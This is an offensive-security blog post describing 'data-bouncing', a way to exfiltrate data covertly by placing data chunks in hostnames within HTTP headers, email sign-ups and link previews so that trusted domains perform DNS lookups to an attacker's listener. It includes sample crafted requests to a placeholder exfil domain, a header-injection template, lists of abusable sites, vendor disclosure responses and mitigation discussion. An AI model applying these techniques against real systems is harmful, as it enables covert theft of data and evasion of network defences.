
Authors:
https://thecontractor.io/data-bouncing/




- [Home](https://thecontractor.io/)
- [Posts](https://thecontractor.io/posts/)
- [Support](https://thecontractor.io/support/)
- [LinkedIn](https://www.linkedin.com/in/j-c-114091a1/)
- [Q&A](https://thecontractor.io/QAA/)

![](https://thecontractor.io/content/images/size/w1200/2023/10/Screenshot-2023-10-10-at-13.37.38.png)

[OFFSEC](https://thecontractor.io/tag/offsec/)

# Data-bouncing

Published Sep 11, 2023

Data-Bouncing - The art of indirect exfiltration. Using & Abusing Trusted Domains as a 2nd Order Transport.

For this to make sense you will need to know some DNS and Web-application principles.

## TL;DR

If you CBA TL;DR hit the Weegiecast link above, it's about an hour (or the Spotify link [here](https://open.spotify.com/episode/1AQO1gGScsicBbiITOcC9W?si=FKLBnUj3QCapiyOKsBGAwQ&ref=thecontractor.io))

### Using DNS to perform covert transfer or communication isn't new, but we have new approaches that offer significant benefits and consequences through novel means by way of soliciting Hostname lookups  

### For example: by directing web requests to certain domains that process hostnames in headers, you can relay small pieces of data to your DNS listener, allowing you to collect and reconstruct data, be it strings, files, or anything else.  
  
- there are more ways, this example is the most obvious we will show.  

Exfil SystemTrusted WebserversDNS Server - Exfil Data CollectionHTTP Requests, to high integrity domainsHeaders: Host: secretmessage1.exfil.comHeaders: X-Forward-For: secretmessage2.exfil.comHeaders: Referer: secretmessage3.exfil.comClient delivered headers processed by trusted webserverHeaders: Host: secretmessage1.exfil.comHeaders: X-Forward-For: secretmessage2.exfil.comHeaders: Referer: secretmessage3.exfil.comLookup secretmessage1.exfil.comExfiltration Data ReceivedIP for secretmessage1.exfil.comLookup secretmessage2.exfil.comExfiltration Data ReceivedIP for secretmessage2.exfil.comLookup secretmessage3.exfil.comExfiltration Data ReceivedIP for secretmessage3.exfil.comalt[Hostname Lookup Solicitation]Exfil SystemTrusted WebserversDNS Server - Exfil Data Collection

Numerous domains, including high-reputation ones, process hostnames in web headers and other application functionality such as email addresses, domain security, web preview fetches and health checking. These requests often appear as normal traffic, making it hard to identify them unless one is familiar with this method or can ascertain its intent.  Exploiting headers appears to be the simplest and most evident, that's what we will demonstrate. We will also demonstrate how to identify Data-Bounce candidates and guide you on how to take advantage of this technique by transmitting files/data. If you delve into Dave's post, you'll gain insights on this method when applied to C2.

💡

PoC Code here from a very kind [Nick Dunn](https://twitter.com/N1ckDunn?ref=thecontractor.io) giving his time to get something functional out for y'all to play with, grow, whatever  
  
[https://github.com/N1ckDunn/DataBouncing](https://github.com/N1ckDunn/DataBouncing?ref=thecontractor.io)  
  
_this_ is to be used in conjunction with an [interactsh](https://github.com/projectdiscovery/interactsh?ref=thecontractor.io) server  
you have to be a little nerdy to pull it off, you have to be super nerdy to help expand this to a bigger tool.  
 

## What does this mean?

- Trusted & High ranking domains will be the most abused as they offer trust that may be mismeasured
- Exfil/C2 Data sends becomes way easier with this new method
- Many web restrictions are no longer applicable - geoblocking, domain blocking, blocking blocking
- Risks & Threat Models will need adjusting
- User Tracking could become more aggressive - Sorry Pi-Hole.
- Swamping the SoC with false alarms - feeding known bad addresses instead of exfil destinations
- Send data out of Cellular/Phone networks with no credit - (I wonder if this works for other cellular/sim blocks - could be a nice heartbeat/proof of life/short messenger in conflict zones
- What else?

I'm sure this list will expand with other renditions of the principle

## The Penny Dropping...

I had noticed that on  http://tile-service.weather.microsoft.com there was a Host header poisoning issue, usually dismissed as N/A in previous contexts Pentesting/Bug-bounty with no real demonstratable impact.

> GET /en-GB/livetile/preinstall HTTP/1.1  
> User-Agent: Microsoft-WNS/10.0  
> Host: **tile-service.weather.microsoft.com**  
> Connection: close

Could Be...

> GET /en-GB/livetile/preinstall HTTP/1.1  
> User-Agent: Microsoft-WNS/10.0  
>  Host: **_ExfilSmallDataChunksHere_.MyExfilDomain.com**  
> Connection: close

What was observed is that my request is hitting Microsoft's infrastructure and failing by way of an error page from Akamai Ghost. However, later on, I see this...

> The Collaborator server received a DNS lookup of type A for the domain name >_**ExfilSmallDataChunksHere**.MyExfilDomain.com._  
> The lookup was received from IP address 88.221.75.79:57999 at 2023-Sep-11 18:37:56.956 UTC.

Not only is this interesting, but it's also reliable, I can use this to send data to _tile-service.weather.microsoft.com_ ... nice, that will surely negate some domain-level controls amongst other defence stuff...

Completely off-topic but Microsoft pushing weather information over HTTP is kinda gross no ? What year is this?

### Please %Internet% can I have some more?

0:00

/10:56

1×

you don't really need to press play here... just 11 minutes of domains we've seen that are useful.

I hit the Majestic-Million, a [list](https://majestic.com/reports/majestic-million?ref=thecontractor.io) of a million addresses that are relatively up-to-date on the most popular domains, and form a healthy list of domains that will allow this attack to not only go via Microsoft but hundreds of thousands of other domains. Many of those are high-ranking and popular sites, we don't even touch all the random subdomains out there.

If you've looked at the Recruiter.sh script we look at a few headers

```

    X-Forwarded-For:
    X-Wap-Profile:
    CF-Connecting_IP:
    Contact:
    X-Real-IP:
    True-Client-IP:
    X-Client-IP:
    Forwarded:
    X-Originating-IP:
    Client-IP:
    Referer:
    From:

```

The Recruiter script shared  will add the domain that is being requested's address into the host header, referer, X-Forwarded-For etc.  like this:

```
    ["X-Forwarded-For"]="xff.%s.oob.com"
    ["X-Wap-Profile"]="wafp.%s.oob.com/wap.xml"
    ["CF-Connecting_IP"]="cfcon.%s.oob.com"
    ["Contact"]="contact.%s.oob.com"
    ["X-Real-IP"]="rip.%s.oob.com"
    ["True-Client-IP"]="trip.%s.oob.com"
    ["X-Client-IP"]="xclip.%s.oob.com"
    ["Forwarded"]="for=ff.%s.oob.com"
    ["X-Originating-IP"]="origip.%s.oob.com"
    ["Client-IP"]="clip.%s.oob.com"
    ["Referer"]="ref.%s.oob.com"
    ["From"]="from.%s.oob.com"

```

So when we get DNS callbacks from hosts in our _domains.txt_ file we can see what brought them to the lookup and who they are, if it was  x-forwarded-for injection point with Google it would look like this '_xff.google.com.oob.com_' (oob.com being your Out-Of-Band interaction server)

Recruiter Script & Interactsh working together to find candidates

To collect the necessary information, you have several options for setting up an Out-of-Band (OOB) DNS listener. You could use Portswigger Collaborator server, but for those using Burp, Gareth Heyes's [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f?ref=thecontractor.io) comes highly recommended. Alternatively, ProjectDiscovery.io's [interact.sh](https://github.com/projectdiscovery/interactsh?ref=thecontractor.io) offers a stable, headless platform, it's been my go-to for bigger work (large-scale exploration).

---

# Other things that can solicit a Hostname lookup

**link preview / URL preview functionality**  
You'll see this in things like x/Twitter, Slack, MS Teams and modern smart communication tools, the interesting thing is once the application knows it's dealing with A URL (maybe URI) it will go and query the hostname, and in turn hand over our pieces of data, you won't even have to technically hit send, just give it to the user interface, and replace, this is cool, but there might be some extra obstacles as you'll need to have active sessions on these systems, so scripting/automating you have more to deal with than just blasting headers, but the ability is there, and you guys are smarter than us... so, do your thing.

UserBrowser/AppHostname LookupDNS Server - Exfil Data CollectionEnters/Pastes URLPerforms Hostname LookupResolves HostnameExfil chunk delivered messagechunk1of50.exfil.comReturns DNS ResolutionReturns Link PreviewDisplays Link PreviewUserBrowser/AppHostname LookupDNS Server - Exfil Data Collection

0:00

/0:42


1×

_Application_ > Link Preview > Hostname lookup > DNS collection

**Web fetching services** that perform web fetching make this easy, if something is fetching the page, in these circumstances has to do DNS lookups first so it can get to the page. These sites take a little more time to identify and would only recommend it as a targeted means if the easier way is off the table.

ExfilBrowserTranslate/Domain Check/PreviewDNS Server - Exfil Data CollectionInitiates Web POST RequestSends Web POST RequestPerforms Hostname LookupExfil chunk delivered to chunkofexfil2of50.exfil.comResponds to Hostname LookupReturns Web ContentDisplays Web Contentalt[Web Content LoadedSuccessfully]ExfilBrowserTranslate/Domain Check/PreviewDNS Server - Exfil Data Collection

Sites like:

- [https://sitereview.zscaler.com](https://sitereview.zscaler.com/?ref=thecontractor.io)
- [https://translate.google.com/?sl](https://translate.google.com/?sl=&ref=thecontractor.io)
- [https://www.virustotal.com/gui/url/](https://www.virustotal.com/gui/url/?ref=thecontractor.io)
- [https://sitecheck.sucuri.net/results/](https://sitecheck.sucuri.net/results/?ref=thecontractor.io)
- [https://www.criminalip.io/asset/search?query=](https://www.criminalip.io/asset/search?query=&ref=thecontractor.io)
- [https://urlscan.io](https://urlscan.io/?ref=thecontractor.io)
- [https://www.ipqualityscore.com/threat-feeds/malicious-url-scanner/](https://www.ipqualityscore.com/threat-feeds/malicious-url-scanner/?ref=thecontractor.io)
- [https://safeweb.norton.com/report/show?url=](https://safeweb.norton.com/report/show?url=&ref=thecontractor.io)
- [https://www.urlvoid.com/scan/](https://www.urlvoid.com/scan/?ref=thecontractor.io)
- [https://scanurl.net/](https://scanurl.net/?ref=thecontractor.io)
- [https://www.isitdownrightnow.com/](https://www.isitdownrightnow.com/?ref=thecontractor.io)
- [https://down.com/](https://down.com/?ref=thecontractor.io)
- [https://checkcybersecurity.service.ncsc.gov.uk/](https://checkcybersecurity.service.ncsc.gov.uk/?ref=thecontractor.io) (sorry boys)
- [https://www.thum.io/](https://www.thum.io/?ref=thecontractor.io)
- [https://securityheaders.com/?q=](https://securityheaders.com/?q=&ref=thecontractor.io)
- [https://www.ssllabs.com/ssltest/analyze.html?d=](https://www.ssllabs.com/ssltest/analyze.html?d=&ref=thecontractor.io)
- [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/?ref=thecontractor.io)
- [https://toolbox.googleapps.com/apps/dig/#A/](https://toolbox.googleapps.com/apps/dig/?ref=thecontractor.io#A/)
- [https://socradar.io](https://socradar.io/?ref=thecontractor.io)

The thing to remember with these is that they're not as clean as the primary example (in terms of using headers to position stuff) but they are another option,  if you had options, I'm fairly confident (cough, cough) that you could enumerate many of the hosts above with the recruiter script and find lots of their infrastructure willing to facilitate forwarding/lookups, but if you were in a heavily locked down environment, having options are nice.

---

**Email Sign-up** locations like:

- [https://en-gb.facebook.com/index.php](https://en-gb.facebook.com/index.php?ref=thecontractor.io)
- [https://tinder.com/en-GB](https://tinder.com/en-GB?ref=thecontractor.io)
- Instructed to not mention this vendor, It might effect their 100% coverage as one of the leading EDRs in defence
- [https://www.reddit.com](https://www.reddit.com/?ref=thecontractor.io) (eventually)
- [https://uber.com/](https://uber.com/?ref=thecontractor.io)
- [https://bbc.com/](https://bbc.com/?ref=thecontractor.io)
- etc...

These are selected at random, but selected to highlight any traffic is on the table, the principal stands  _get stuff to hand over a hostname lookup_

ExfilEmail ServiceSMTP ServerDNS Server - Exfil Data CollectionSigns up with email random@exfilchunk5of50.exfil.comRequests Confirmation Email SendingPerforms Hostname LookupExfil chunk delivered to exfilchunk5of50.exfil.comResolves DomainSends Confirmation Email, or notExfilEmail ServiceSMTP ServerDNS Server - Exfil Data Collection

If you visualise the principle of 'how to solicit, or what can solicit a Hostname lookup'... any email sign-up will work because it has to perform the lookup to send you emails, but the balance here is how much effort is it worth. if you choose to pick one target to send all the data through you will get your data, but it opens up more chances that more people can rebuild those files too.  The ones listed are a little overzealous in checking the email in the sign-up journey, but you get it right, Do you see how this is all coming together and growing legs?

With the headers in the first part of this post, they're sent via GET requests, but the submissions will mostly be sent via POST requests, Can we do this with other HTTP verbs? For sure, while our script won't look for OPTIONS it might be a challenge for the app layer logging, where they may only log POST and GETs, it is often irrelevant to the principle but more about hiding residual data that might imply you've been data-bouncing, similarly, you can use http2 and we've also seen http3 where supported. more research is needed, please feel free to FAFO.

oh, don't forget open redirects! get them on the pile.

_**Do note; that some firewalls will block the HTTP(S) request, after the DNS has bolted, keep that in mind too.**_

---

# Risks & Implications

This is the fun bit because if you were to bust out a CVSS calculator you're going to struggle to measure this with the traditional infosec hat on... unless you're targeting a specific set of domains to push data through it's like farting and trying to understand what bean it was. If the data is fragmented, and encrypted and is hidden in random headers hitting many domains, your means of identification are the endpoints realistically, but we would love to get our minds blown by a fix on the wire.

It would be interesting to hear back from the community on measuring this, Ollie Whitehouse (@[ollienowhere](https://twitter.com/ollieatnowhere?ref=thecontractor.io) / [https://bluepurple.binaryfirefly.com](https://bluepurple.binaryfirefly.com/?ref=thecontractor.io)/) had some interesting points that are great questions worth exploring answers to

> Risks I would want to consider include:  
> Are you considered a data processor under GDPR ?  
>   
> Are you considered to have broken sanctions ?  
>   
> Are you considered compromised / part of a C2  raising the risk of dealing with law enforcement or other legal process ?  
>   
> Are you considered compromised / part of a C2 so appear on a domain / IP reputation list  ?  
>   
> For cyber defenders this just becomes a complex detection issue.So in short operational / legal risks as opposed to technical?

## GDPR Nuances

  
Data Processing: The General Data Protection Regulation (GDPR) is concerned with the protection of personal data. If your infrastructure processes (e.g., collects, stores, modifies, transmits) personal data of EU citizens without their consent, or without another lawful basis, then you could be in breach.

1. **Control & Responsibility**: If your infrastructure is used by others to process personal data, GDPR would typically classify entities as either "data controllers" or "data processors". If you have control over the purposes and means of the processing, you would be a data controller. If you are simply processing data on behalf of a data controller (like a cloud service provider), you would be a data processor. Both roles have responsibilities under GDPR. If your infrastructure is abused by third parties to violate GDPR, while you may not be the primary data controller, you still might have responsibilities as a data processor.
2. **Security**: Under GDPR, you have an obligation to ensure that personal data is protected against unauthorized access, loss, and destruction. If your infrastructure has vulnerabilities that can be exploited to send messages, you could be seen as not providing adequate security, which can be a GDPR violation.
3. **Notification of Breaches**: GDPR requires entities to report certain types of data breaches to the relevant authorities within 72 hours of becoming aware of the breach. If your infrastructure is compromised, and the personal data of EU citizens is at risk, you have an obligation to notify the relevant authorities and potentially the affected individuals.
4. **Third-Party Actions**: If someone uses your infrastructure to send messages without your knowledge, and in doing so breaches GDPR, the primary responsibility might fall on that third party. However, if you become aware of the misuse and don't take appropriate action, you might also share in the liability.
5. **Data Transfers**: If your infrastructure transfers personal data outside of the European Economic Area (EEA), you need to ensure that there are adequate safeguards in place for that transfer, as per GDPR.
6. **Data Protection by Design & Default**: GDPR introduces principles of data protection by design and by default, meaning you should consider data protection issues at the design phase of any system or service and have default settings be privacy-friendly.

## Sanction Concerns

Sanctions are imposed by countries or international organizations (like the United Nations) to achieve specific foreign policy or national security objectives. These might restrict trade, financial transactions, or other economic activities with specific countries, entities, or individuals.

1. **Due Diligence:** If you are aware that your infrastructure is being used, or could potentially be used, to breach sanctions, you should conduct due diligence to understand the scope and nature of the activities.
2. **Knowledge and Intent:** In many jurisdictions, knowingly facilitating or failing to prevent the violation of sanctions can lead to penalties. Even if you didn't originally intend for your infrastructure to be used in this way, once you become aware of such use, you may have a legal obligation to take action.
3. **Reporting Obligations:** Depending on where you operate, you might have an obligation to report suspicious activities related to sanctions violations to the relevant authorities.
4. **Risk of Secondary Sanctions:** Some countries, especially the United States, can impose secondary sanctions. This means that even if you don't directly breach the primary sanction, if you facilitate or support those who do, you could be at risk.
5. **Protective Measures:** It's crucial to have measures in place to prevent and detect potential misuse of your infrastructure. This can include monitoring tools, user agreements that prohibit illegal activities, and routine checks to ensure compliance.
6. **Jurisdictional Complexity:** Sanctions regimes can vary greatly between countries. For instance, the European Union, the United States, and the United Nations might have different sanctions against the same country or entity. If your infrastructure operates globally, you'll need to be aware of and navigate these differences.
7. **Penalties:** Violating sanctions can lead to significant penalties, including financial penalties, restrictions on business operations, and reputational damage.

With regard to C2 or exfil facilitation, it will be fascinating to see how this is interpreted. Do you want your domain on a list for transferring stolen data? or material that you really don't want associating with your corp/gov/thing domain?  
  
Ollie posits that it's fair to say there is a legal and operational risk here, as a general rule, I tend not to disagree with him, this might be new territory for the policy folk to explore.

## Good Questions for your organisation

It's not quite hacking your organisation but it's leaning on your organisation's reputation and infrastructure to conduit unfettered data - What are the relative optics and implications?

### Establishing why you or your organisation might need or want to process hostnames.

1. **Security & Validation**: To ensure that a given hostname is valid, processing might be necessary. By examining hostnames, systems can potentially prevent or identify malicious activity, like domain spoofing.
2. **Domain allow-listing/deny-listing**: For both emails and web applications, there may be a list of trusted domains or a list of blocked domains. Processing hostnames allows systems to enforce such policies.
3. **Load Balancing & Traffic Routing**: In large-scale web applications, processing hostnames can be used to direct traffic to appropriate servers or data centres, optimizing user experience and resource allocation.
4. **User Experience & Personalization**: Based on the hostname or domain, a system might provide tailored content. For instance, a content delivery system might serve region-specific data based on the requesting domain.
5. **Analytics & Monitoring**: Analyzing hostnames can provide valuable insights into the sources of traffic, the popularity of specific resources, or the geographical distribution of users.
6. **Email Verification**: When processing email addresses during user signups, examining the hostname (the part after '@') can ensure the domain exists and can receive emails, potentially reducing spam or fake accounts.
7. **DNS Resolution**: Checking the Domain Name System (DNS) records associated with a hostname can provide information about its IP address, mail servers, and more. This can be used for various purposes, from simple pings to advanced network diagnostics and more.
8. **Branding & Affiliate Recognition**: If your application involves partnerships or affiliate marketing, processing hostnames can identify partners or affiliate referrals, ensuring they receive proper credit.
9. **Regulatory & Compliance Reasons**: In some jurisdictions, there may be regulations about data handling based on the origin or destination of data (e.g., GDPR in Europe). Processing hostnames can help in ensuring compliance by identifying the source or destination domain.

---

## Red Teams and Adversarial Computer Botherers...

There is loads of fun to be had here, this isn't going away any time soon

If you do introduce this method into your operations, I would suggest using defence providers that are leaving this issue unaddressed as your data bouncing sources, this will certainly convert into positive pressure for them to do something about it. as opposed to other opportunities that may not have the means to yield pressure, and have no idea what's going on.

I hope to see this method being used in all the frameworks, I'd love to see it fixed too. It's a good bug to squash, but is it possible?

It's got a MrD0x style of 'living off trusted sites' but without going through the domain's website/API applications, also being able to distribute over massive domain namespaces with very little config wrangling in the first half, and the 2nd half is good old DNS exfil & rebuild.

Some reasons why you might want to introduce this method, or some reasons why you might want to address this method

Domain Categorisation is less of an issue as the domains that are being used aren't yours, can be tailored to circumstance, security providers, trusted cloud providers and the destination doesn't have the traditional web server, ports service... controls are wanting here.  

  
But you can still come chat with us on there [@thecontractor](https://twitter.com/TheContractorio?ref=thecontractor.io) [@deathspirate](https://twitter.com/DeathsPirate?ref=thecontractor.io) - we want to know what to do with Data-bouncing.

We have some fairly comprehensive data across large domain datasets tagged on header points that we can use, this extends into subdomains and any internet routable domain named address really, but we focus on the high-ranking ones to get people's attention, I think it's fair to say if you're on the positive side of defence asking myself or Dave for data, you'll probably get it, speaking of Dave...

# I need to talk more about Dave Mound...

Dave and I have worked hand in hand on all the things mentioned above, but he's really dropped it a gear and accelerated away with his research into weaponising this outside of file/message sends, focusing on C2 integration, we know one of our friends we shared this with is already using this method as a heartbeat in their internal implant kit (what's up Gilly), anyway, Dave has the power of SecurityScorecard under his belt so the analysis piece is all on him, Sorry Dave! Although I know it's not too much of a hassle with SecurityScorecards UI hit the link below where he takes you on a journey through the awesome things he's built and analysed. We were both giddy as kids with this.

💡

This was going to be Dave's link, you'll have to follow him on [twitter](https://twitter.com/DeathsPirate?ref=thecontractor.io) to see when / if he publishes anything (he's a busy boy)

0:00

/0:50

1×

./Dave -pew=yes

💡

Go forth off-sec and show us what you can do with this method.

## Fix?

### What are we fixing?

The fix is a hard one, you have to be OK with what you surrender in terms of functionality, if you remove the capability to resolve user-supplied hostnames that may be processed on your systems or upstream 2nd order systems, that might be an architectural dealbreaker, so this might be something that hangs around for a long time.  
Detecting this may be slippy if you have many DNS listeners, many targets, many headers, send schema's, speeds and whatever else is dynamic around the principle... it's not really cat and mouse but multiple cats, you're the mouse. There are many fair reasons why you may need or want to resolve hostnames, I get the feeling there are a lot of companies that will wait for someone else to solutionize this, that's fine, it happens, I have some ideas but it won't take off unless it takes off, I suspect publishing this method will be one of the better reasons why people might pull a finger out.

# Is my product open to abuse?

Probably.  
An easy thing to do for those technically capable** at least for the headers is to crawl your application with Burpsuite and Collaborator Everywhere, you'll need to also add a match and replace rule for the Host header, unless you've got additional plugins, broadly speaking this will cover your web headers, but if your application is performing link previews, web fetches, remote loads of external untrusted content then that should be open for abuse just as much as an email sign up.  
  
**_Speak to your SecOps team, your Appsec Team or your Security provider to understand the issue and then demonstrate its presence or absence from your application(s)/Infrastructure/etc..._

## Vendor & Organisation Responses

### possibly need more incentive before anyone is willing to address

After a few responses were starting to look thematic in a depressing way, we decided to dump the idea that we'd spend any serious time reaching out to any more people, those that we did reach out to, we consider fairly apex, we're not doing bottom up, this project took a fair amount of time and energy from Dave and me, We reach out, make sure someone's got it, leave it at that, if they want to engage, we'd love too.  
  
We approached Akamai as they were the dominant percentile in our initial 'Majestic Million' and known as a heavy hitter in pretty decent defence, the numbers looked around 20% of our initial sweep to have the Akamai Ghost Server response header, and what we knew from our initial PoC (called FedEx, I'll let Dave explain that one) was that the application layer didn't play a part in Data-bouncing at least for headers hitting the CDNs, as the host header was parentally processed, and while some responses are 'this is a parental problem' .. yeah, sure, but it's Akamai customer's domains and the trust that it brings to network defences, WAF's, Firewalls, Exceptions etc ... that's allowing trusted traffic out and must acknowledge responsibility for that, even if it's just pressuring Akamai, or the last nail in the coffin to move to another CDN provider, perhaps one with more flare and tanacity to throw down with hard problems.  hopefully, all content delivery networks will pull something out of the bag for this one, it still leaves _many many_ other places where data-bouncing exists, but at least if you use these CDN/WAF providers you know that you arent participating in the facilitation of exfil or C2.

The response from Akamai was mixed messages with things we weren't speaking too (SSRF, DDOS, and DNS to DNS exfil, non of which we spoke of, we replied and reiterated what it was, and what it wasn't, and that we have an open line if they want to reach out but we're hoping others in the industry might be up for the challenge to fix

> "Since there is no mitigating the problem without overhauling how the Internet works, we rely on monitoring and detection. Our DNS infrastructure, and DNS products that run on the same, include monitoring for such abuse scenarios. Due to the extremely high query/leak rates via DNS exfiltration, exfiltration can be detected reasonably quickly before damage is done." – Kaan Onarlioglu Principal Architect, InfoSec @Akamai

We've had demo-C2 running over Akamai and data sends for more than a month and we haven't really done any considered opsec-obfuscation of all the areas that we could, I'm not sure they understand but we've done our best to articulate,  maybe they do understand but ... need to tweak those detections.

Other companies that are attempting to write detections are a little more honest about the challenge in false positive rates and the dynamic nature of this method

  
(Microsoft) MSRC

> Hello,  
>   
> Thank you for contacting the Microsoft Security Response Center (MSRC). We appreciate your support in protecting Microsoft and our customers. Although your report included some good information, it does not meet Microsoft’s requirement as a security vulnerability for servicing.

![](https://thecontractor.io/content/images/2023/10/Screenshot-2023-10-17-at-00.18.14.png)

EDR Vendor not wanting to be named, 

There was one company that we thought we'd get some good traction from that managed to tell us it's a non-issue, while not disputing we can shovel C2 and all that data exfil goodness over their domains in various ways (headers and signups),  I can kinda see where they're coming from in terms of not being able to do anything about it but the language and the position, telling us we need to speak to Akamai, and Akamai tell us it's how the internet works, If I was a defence provider that didnt want to be named that is using akamai I'd probably speak to them directly especially if I was one of the biggest in the market, it strikes me as strange that they didn't... anyway, Dave and I have a low tolerence for attrition-ping-pong but it feels a bit head-in-sand from the titans you'd expect to run at this problem, a bit disappointing.

On the other side of the spectrum I've heard a UK commercial defence provider have had a good go at defending against this, and that just might be enough signal for you to investigate behaviour if you use that perticular company.  - you may want to reach out to your defence provider and ask what they can do for you in reguards to this concern - if you're concerned.

## Future Explorations

### Sounds like a you problem...

Some things that would be excellent to explore (for anyone enjoying this)

**Generally:**

- HTTP/2 - mix it up
- HTTP/3 - Mix it up
- Multiple Listeners

**For Recruiting and Bouncing:**

- HTTP Verbs - POST, PUT, OPTIONS, Etc...
- Common Web-content requests to mask stuff (robots.txt/index.htm/etc..)
- Variations of data sending schema, moving away from encoding, Words, terms - Ideas?

**For work in 'fetches' (link previews, page pulls etc...)**

- Enumeration Tooling
- Templates

**For eMails**

- Enumeration Tooling
- Templates

**For C2**

- More integrations
- More methods than headers

**Large Scale Discovery**

- [https://github.com/tb0hdan/domains](https://github.com/tb0hdan/domains?ref=thecontractor.io)

---

End of Part One

  
John - [https://twitter.com/TheContractorio](https://twitter.com/TheContractorio?ref=thecontractor.io)  
Dave - [https://twitter.com/DeathsPirate](https://twitter.com/DeathsPirate?ref=thecontractor.io)

#### READ NEXT

[

### File Folding.

](https://thecontractor.io/origami/)

File Folding is a technique that moves a file into hex, and that hex is broken into folder file names in a fashion that can be reconstructed.

[READ MORE](https://thecontractor.io/origami/)

[

### Publicker.

](https://thecontractor.io/publicker/)

Cross-referencing acquired credentials against public known, known bad credentials in a bid to really hit home the cultural change required. or just fully breaking down a target.

[READ MORE](https://thecontractor.io/publicker/)

[

### Three-Word Password Attacks

](https://thecontractor.io/three-word-password-attacks/)

The idea behind three word passwords as a concept is in my opinion a nice nudge in the right direction, In a perfect world, a passphase or a sentence

[READ MORE](https://thecontractor.io/three-word-password-attacks/)

[](http://localhost:2368/)

Emergency Cyber Security Support

The Contractor 🏴‍☠️🧯 © 2024

### Connect

Twitter

[@thecontractorio](https://twitter.com/thecontractorio)

Bluesky

[@thecontractorio](https://bsky.app/profile/thecontractorio.bsky.social)

Threads

[@yosignals](https://www.threads.net/@yosignals)

LinkedIn

[JC](https://www.linkedin.com/in/j-c-114091a1/)

### Pages

- [Support](https://thecontractor.io/support/)
- [Posts](https://thecontractor.io/posts/)
- [Q&A](https://thecontractor.io/qaa/)

### Topics

- [OSINT](https://thecontractor.io/tag/osint/)
- [Defence](https://thecontractor.io/tag/defence/)
- [Appsec](https://thecontractor.io/tag/appsec/)
- [Entsec](https://thecontractor.io/tag/entsec/)
- [Infosec](https://thecontractor.io/tag/infosec/)
- [Offsec](https://thecontractor.io/tag/offsec/)
- [Exploitation](https://thecontractor.io/tag/exploitation/)
- [Privacy](https://thecontractor.io/tag/privacy/)
- [Random](https://thecontractor.io/tag/random/)
- [Ideas](https://thecontractor.io/tag/ideas/)
- [Archive](https://thecontractor.io/tag/archive/)